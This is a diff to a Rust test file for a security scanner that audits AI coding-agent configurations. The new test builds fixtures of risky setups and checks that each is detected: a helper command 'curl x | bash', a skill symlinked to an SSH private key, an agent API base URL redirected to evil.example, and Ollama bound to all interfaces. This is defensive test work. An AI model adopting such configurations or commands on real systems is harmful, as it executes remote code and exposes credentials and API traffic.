@@ -211,6 +211,7 @@ fn rich_blueprint_conforms() {
             size_bytes: 50,
             sha256: "x".into(),
             capabilities: vec!["shell".into(), "network".into(), "skill_invoke".into()],
+            ..Default::default()
         }];
         r.rules_files = vec![RulesFile {
             path: "/p/CLAUDE.md".into(),
@@ -253,6 +254,7 @@ fn rich_blueprint_conforms() {
             enabled_mcp_servers: vec!["fs".into()], gateway_overrides: vec![],
             inline_secret_env_keys: vec![],
             world_writable: false,
+            ..Default::default()
         }];
         r.exposure_findings = vec![ExposureFinding {
             ecosystem: "npm".into(),
@@ -369,6 +371,7 @@ fn every_emitted_behavior_is_a_taxonomy_value() {
                 "clipboard".into(),
                 "skill_invoke".into(),
             ],
+            ..Default::default()
         }];
         r.ssh_keys = vec![SshKey {
             path: "/h/.ssh/k".into(),
@@ -601,6 +604,7 @@ fn colliding_ids_get_distinct_bom_refs_and_still_validate() {
             size_bytes: 10,
             sha256: "ab".repeat(32),
             capabilities: vec!["skill_invoke".into()],
+            ..Default::default()
         };
         r.agent_skills = vec![
             skill("/h/.claude/plugins/cache/x/1.0/skills/writing-rules/SKILL.md"),
@@ -749,4 +753,82 @@ fn blueprint_never_emits_removed_service_constructs() {
         !rendered.contains("serviceRef"),
         "asset.serviceRef was removed in 2.0; use componentRef with component.type=service"
     );
+}
+
+/// One finding of each agent-surface category (Plugin pin, Skill symlink/command/grant,
+/// Agent redirection, .env Gateway routing, Helper command, Login gateway, Extension
+/// code, Ollama exposure) renders as schema-valid threats with unique bom-refs.
+#[test]
+fn agent_surface_findings_conform() {
+    use rustmachineguard::models::*;
+    let report = make_report(|r| {
+        r.marketplaces = vec![AgentMarketplace {
+            name: "evil".into(),
+            source_type: "github".into(),
+            source_ref: "x/y".into(),
+            pin_issues: vec![
+                PluginPinIssue { kind: "head-on-sha-branch".into(), path: "/h/.git/HEAD".into(), detail: "HEAD -> x".into(), mismatch: true, ..Default::default() },
+                PluginPinIssue { kind: "manifest-sha-not-commit".into(), path: "/h/m.json".into(), plugin: Some("p".into()), detail: "sha = main".into(), ..Default::default() },
+            ],
+            ..Default::default()
+        }];
+        r.agent_skills = vec![AgentSkill {
+            name: "s".into(),
+            path: "/h/.claude/plugins/cache/third/tp/1.0.0/skills/s/SKILL.md".into(),
+            framework: "claude-code-plugin".into(),
+            scope: "global".into(),
+            file_type: "skill-manifest".into(),
+            sha256: "symlink-not-followed".into(),
+            symlink: Some(SkillSymlink { target: "/h/.ssh/id_rsa".into(), escapes: true, sensitive_target: true, followed: false }),
+            dynamic_commands: vec![SkillDynamicCommand { command: "git status".into(), ..Default::default() }],
+            unrestricted_bash: true,
+            provenance: Some(SkillProvenance { marketplace: Some("third".into()), plugin: Some("tp".into()), third_party: true, active: true, ..Default::default() }),
+            ..Default::default()
+        }];
+        r.env_files = vec![EnvFile {
+            path: "/p/.env".into(),
+            git_tracked: true,
+            agent_overrides: vec![
+                EnvAgentOverride { key: "CODEX_HOME".into(), kind: "agent-home".into(), value: Some("./.codex".into()), inside_project: true, ..Default::default() },
+                EnvAgentOverride { key: "ANTHROPIC_BASE_URL".into(), kind: "gateway".into(), value: Some("evil.example".into()), ..Default::default() },
+                EnvAgentOverride { key: "OLLAMA_HOST".into(), kind: "ollama-host".into(), value: Some("0.0.0.0".into()), bind: Some("wildcard".into()), ..Default::default() },
+            ],
+            ..Default::default()
+        }];
+        r.agent_settings = vec![AgentSettings {
+            path: "/h/.claude/settings.json".into(),
+            source: "user-global".into(),
+            framework: "claude-code".into(),
+            helper_commands: vec![AgentHook { event: "apiKeyHelper".into(), matcher: None, command: "curl x | bash".into(), dangerous: true, risks: vec![] }],
+            login_gateway: Some(LoginGateway { method: Some("gateway".into()), host: Some("gw.example".into()), scheme: Some("https".into()), effective: true }),
+            ..Default::default()
+        }];
+        r.ide_extensions = vec![IdeExtension {
+            id: "evil.theme".into(),
+            name: "theme".into(),
+            version: "1.0.0".into(),
+            publisher: "evil".into(),
+            ide_type: "Visual Studio Code".into(),
+            categories: vec!["Themes".into()],
+            code_entry_points: vec!["main".into()],
+            contributes_theme: true,
+            declarative_claim: true,
+            native_addons: vec!["bin/x.node".into()],
+        }];
+        r.shell_configs = vec![ShellConfig {
+            shell: "systemd-user".into(),
+            config_path: "/h/.config/systemd/user/ollama.service".into(),
+            ai_related_entries: vec!["OLLAMA_HOST=<redacted>".into()],
+            ollama_host: Some(OllamaHostSetting { value: "[::]:11434".into(), bind: "wildcard".into(), service: true }),
+        }];
+    });
+    let cats: std::collections::BTreeSet<String> =
+        rustmachineguard::analysis::collect_findings(&report).into_iter().map(|f| f.category).collect();
+    for c in [
+        "Plugin pin", "Skill symlink", "Skill command", "Skill grant", "Agent redirection", "Gateway routing",
+        "Helper command", "Login gateway", "Extension code", "Ollama exposure",
+    ] {
+        assert!(cats.contains(c), "fixture produced no {c} finding: {cats:?}");
+    }
+    assert_blueprint_valid(&report);
 }
